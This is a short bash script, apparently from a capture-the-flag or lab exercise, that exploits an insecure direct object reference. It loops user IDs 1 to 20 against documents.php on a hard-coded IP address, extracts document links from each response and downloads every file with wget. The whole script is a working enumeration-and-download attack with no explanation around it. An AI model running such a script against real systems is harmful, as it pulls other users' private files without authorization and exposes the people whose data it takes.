#!/bin/bash
base="http://83.136.249.246:54082"

for uid in {1..20}; do
  echo "[*] Checking uid=$uid"
  curl -s -X POST "$base/documents.php" -d "uid=$uid" |
    grep -oP "/documents/[^']+" |
    while read url; do
      echo "  [+] Downloading $url"
      wget -q "$base${url}"
    done
done
